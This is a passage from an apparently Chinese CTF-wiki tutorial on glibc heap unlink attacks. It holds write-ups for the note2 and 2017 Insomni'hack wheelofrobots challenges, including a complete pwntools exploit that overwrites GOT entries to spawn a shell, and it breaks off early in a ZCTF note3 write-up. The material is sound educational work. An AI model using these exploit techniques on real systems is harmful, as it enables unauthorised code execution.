chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002\n\n\n                                   +-----------------+high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |   \n\\x00\n+\nb\n*7  |\n                ptr[2]-----------\n +-----------------+ chunk 2\n                                   |    size=0x90    |\n                                   +-----------------+\n                                   |    0xa0         |\n                                   +-----------------+------------\n                                   |    \na\n*8        |\n                                   +-----------------+\n                                   |    \na\n*8        |\n                 ptr[1]----------\n +-----------------+ chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk\ns nextchunk-----\n+-----------------+\n                                   |    64*\na\n       |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |    \na *8        |\n                 ptr[0]----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe2\n\n\n\n\n\u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f\n\n\n    \nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n\n\n\n\nunlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002\n\n\n\u83b7\u53d6system\u5730\u5740\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\n# overwrite the chunk0(which is ptr[0]) with got atoi\n\n\natoi_got\n \n=\n \nnote2\n.\ngot\n[\natoi\n]\n\n\ncontent\n \n=\n \na\n \n*\n \n0x18\n \n+\n \np64\n(\natoi_got\n)\n\n\neditnote\n(\n0\n,\n \n1\n,\n \ncontent\n)\n\n\n# get the aoti addr\n\n\nshownote\n(\n0\n)\n\n\n\nsh\n.\nrecvuntil\n(\nis \n)\n\n\natoi_addr\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\nprint\n \natoi_addr\n\n\natoi_addr\n \n=\n \nu64\n(\natoi_addr\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nprint\n \nleak atoi addr: \n \n+\n \nhex\n(\natoi_addr\n)\n\n\n\n# get system addr\n\n\natoi_offest\n \n=\n \nlibc\n.\nsymbols\n[\natoi\n]\n\n\nlibcbase\n \n=\n \natoi_addr\n \n-\n \natoi_offest\n\n\nsystem_offest\n \n=\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n\nsystem_addr\n \n=\n \nlibcbase\n \n+\n \nsystem_offest\n\n\n\nprint\n \nleak system addr: \n,\n \nhex\n(\nsystem_addr\n)\n\n\n\n\n\n\u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002\n\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002\n\n\n\u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002\n\n\n\u4fee\u6539atoi got\n\n\n# overwrite the atoi got with systemaddr\n\n\ncontent\n \n=\n \np64\n(\nsystem_addr\n)\n\n\neditnote\n(\n0\n,\n \n1\n,\n \ncontent\n)\n\n\n\n\n\n\u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002\n\n\nget shell\n\n\n# get shell\n\n\nsh\n.\nrecvuntil\n(\noption---\n)\n\n\nsh\n.\nsendline\n(\n/bin/sh\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002\n\n\n2017 insomni'hack wheelofrobots\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2017_insomni\nhack_wheelofrobots git:(master) file wheelofrobots \n\n\nwheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped\n\n\n\u279c  2017_insomni\nhack_wheelofrobots git:\n(\nmaster\n)\n checksec wheelofrobots \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni\nhack_wheelofrobots/wheelofrobots\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002\n\n\n\u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002\n\n\n\u5177\u4f53\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019\nread_num((char *)\nchoice, 5uLL);\n \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7\ncalloc(1uLL, 20 * v5);\n \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 \n20*v5\n \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c \ndestructor_size = v5\n  \u4ecd\u7136\u4f1a\u5f88\u5927\u3002\n\n\n\u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002\n\n\n\u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6 \nresult = read(0, destructor, 20 * destructor_size);\n \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002\n\n\n\n\n\u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 \ndestructor_size\n\u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002\n\n\n\u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002\n\n\n\u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 \nexit()\n patch \u4e3a\u4e00\u4e2a \nret\n \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002\n\u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002\n\n\n\u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./wheelofrobots\n\n\nrobots\n \n=\n \nELF\n(\n./wheelofrobots\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./wheelofrobots\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \noffset_bin_main_arena\n(\nidx\n):\n\n    \nword_bytes\n \n=\n \ncontext\n.\nword_size\n \n/\n \n8\n\n    \noffset\n \n=\n \n4\n  \n# lock\n\n    \noffset\n \n+=\n \n4\n  \n# flags\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n10\n  \n# offset fastbin\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n2\n  \n# top,last_remainder\n\n    \noffset\n \n+=\n \nidx\n \n*\n \n2\n \n*\n \nword_bytes\n  \n# idx\n\n    \noffset\n \n-=\n \nword_bytes\n \n*\n \n2\n  \n# bin overlap\n\n    \nreturn\n \noffset\n\n\n\n\ndef\n \nadd\n(\nidx\n,\n \nsize\n=\n0\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nif\n \nidx\n \n==\n \n2\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Bender\ns intelligence: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nelif\n \nidx\n \n==\n \n3\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Robot Devil\ns cruelty: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nelif\n \nidx\n \n==\n \n6\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Destructor\ns powerful: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n\n\n\ndef\n \nremove\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nchange\n(\nidx\n,\n \nname\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nrecvuntil\n(\nRobot\ns name: \n\\n\n)\n\n    \np\n.\nsend\n(\nname\n)\n\n\n\n\ndef\n \nstart_robot\n():\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n4\n)\n\n\n\n\ndef\n \noverflow_benderinuse\n(\ninuse\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsend\n(\n9999\n \n+\n \ninuse\n)\n\n\n\n\ndef\n \nwrite\n(\nwhere\n,\n \nwhat\n):\n\n    \nchange\n(\n1\n,\n \np64\n(\nwhere\n))\n\n    \nchange\n(\n6\n,\n \np64\n(\nwhat\n))\n\n\n\n\ndef\n \nexp\n():\n\n    \nprint\n \nstep 1\n\n    \n# add a fastbin chunk 0x20 and free it\n\n    \n# so it is in fastbin, idx2-\nNULL\n\n    \nadd\n(\n2\n,\n \n1\n)\n  \n# idx2\n\n    \nremove\n(\n2\n)\n\n    \n# overflow bender inuse with 1\n\n    \noverflow_benderinuse\n(\n\\x01\n)\n\n    \n# change bender\ns fd to 0x603138, point to bender\ns size\n\n    \n# now fastbin 0x20, idx2-\n0x603138-\nNULL\n\n    \nchange\n(\n2\n,\n \np64\n(\n0x603138\n))\n\n    \n# in order add bender again\n\n    \noverflow_benderinuse\n(\n\\x00\n)\n\n    \n# add bender again, fastbin 0x603138-\nNULL\n\n    \nadd\n(\n2\n,\n \n1\n)\n\n    \n# in order to malloc chunk at 0x603138\n\n    \n# we need to bypass the fastbin size check, i.e. set *0x603140=0x20\n\n    \n# it is at Robot Devil\n\n    \nadd\n(\n3\n,\n \n0x20\n)\n\n    \n# trigger malloc, set tinny point to 0x603148\n\n    \nadd\n(\n1\n)\n\n    \n# wheels must \n= 3\n\n    \nremove\n(\n2\n)\n\n    \nremove\n(\n3\n)\n\n\n    \nprint\n \nstep 2\n\n    \n# alloc Destructor size 60-\n0x50, chunk content 0x40\n\n    \nadd\n(\n6\n,\n \n3\n)\n\n    \n# alloc devil, size=20*7=140, bigger than fastbin\n\n    \nadd\n(\n3\n,\n \n7\n)\n\n    \n# edit destructor\ns size to 1000 by tinny\n\n    \nchange\n(\n1\n,\n \np64\n(\n1000\n))\n\n    \n# place fake chunk at destructor\ns pointer\n\n    \nfakechunk_addr\n \n=\n \n0x6030E8\n\n    \nfakechunk\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x20\n)\n \n+\n \np64\n(\nfakechunk_addr\n \n-\n \n0x18\n)\n \n+\n \np64\n(\n\n        \nfakechunk_addr\n \n-\n \n0x10\n)\n \n+\n \np64\n(\n0x20\n)\n\n    \nfakechunk\n \n=\n \nfakechunk\n.\nljust\n(\n0x40\n,\n \na\n)\n\n    \nfakechunk\n \n+=\n \np64\n(\n0x40\n)\n \n+\n \np64\n(\n0xa0\n)\n\n    \nchange\n(\n6\n,\n \nfakechunk\n)\n\n    \n# trigger unlink\n\n    \nremove\n(\n3\n)\n\n\n    \nprint\n \nstep 3\n\n    \n# make 0x6030F8 point to 0x6030E8\n\n    \npayload\n \n=\n \np64\n(\n0\n)\n \n*\n \n2\n \n+\n \n0x18\n \n*\n \na\n \n+\n \np64\n(\n0x6030E8\n)\n\n    \nchange\n(\n6\n,\n \npayload\n)\n\n\n    \nprint\n \nstep 4\n\n    \n# make exit just as return\n\n    \nwrite\n(\nrobots\n.\ngot\n[\nexit\n],\n \n0x401954\n)\n\n\n    \nprint\n \nstep 5\n\n    \n# set wheel cnt =3, 0x603130 in order to start robot\n\n    \nwrite\n(\n0x603130\n,\n \n3\n)\n\n    \n# set destructor point to puts@got\n\n    \nchange\n(\n1\n,\n \np64\n(\nrobots\n.\ngot\n[\nputs\n]))\n\n    \nstart_robot\n()\n\n    \np\n.\nrecvuntil\n(\nNew hands great!! Thx \n)\n\n    \nputs_addr\n \n=\n \np\n.\nrecvuntil\n(\n!\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base: \n \n+\n \nhex\n(\nlibc_base\n))\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n\n    \n# make free-\nsystem\n\n    \nwrite\n(\nrobots\n.\ngot\n[\nfree\n],\n \nsystem_addr\n)\n\n    \n# make destructor point to /bin/sh addr\n\n    \nwrite\n(\n0x6030E8\n,\n \nbinsh_addr\n)\n\n    \n# get shell\n\n    \nremove\n(\n6\n)\n\n    \np\n.\ninteractive\n()\n\n\n    \npass\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\nDEFCON 2017 Qualifiers beatmeonthedl\n \n\n\n\n\n\u53c2\u8003\n\n\n\n\nmalloc@angelboy\n\n\nhttps://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a\n\n\n\n\nnote3\n\n\n\u4ecb\u7ecd\n\n\nZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002\n\n\n\u9898\u76ee\u4ecb\u7ecd\n\n\n\u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd\n\n\n1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Quit\noption---\n\n\n\n\n\n\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\n\n\nCanary                        : Yes\nNX                            : Yes\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial\n\n\n\n\n\u529f\u80fd\u6982\u8ff0\n\n\n\u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002\n\n\nint new()\n{\n  puts(\nInput the length of the note content:(less than 1024)\n);\n  size = get_num();\n  if ( size \n 0 )\n    return puts(\nLength error\n);\n  if ( size \n 1024 )\n    return puts(\nContent is too long\n);\n  heap_ptr = malloc(size);\n  puts(\nInput the note content:\n);\n  my_read(heap_ptr, size, \n\\n\n);\n  bss_ptr[i] = heap_ptr;\n  current_ptr[i + 8LL] = size;\n  current_ptr[0] = bss_ptr[i];\n  return printf(\nnote add success, the id is %d\\n\n, i);\n}\n\n\n\n\n\u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002\n\u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002\n\n\n.bss:\ncurrent_ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size\n\n\n\n\nShow\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002\n\n\n\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002\n\u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002\n\n\nint edit()\n{\n\n  id = get_num();\n  data_ptr = ptr[id];\n  if ( data_ptr )\n  {\n    puts(\nInput the new content:\n);\n    my_read(ptr[id], current_ptr[id + 8], \n\\n\n);\n    current_ptr[0] = ptr[id];\n    data_ptr = puts(\nEdit success\n);\n  }\n}\n\n\n\n\n\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr\n\n.bss:\ncurrent_ptr \n== edit ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr   \n== size\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size\n\n\n\u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit 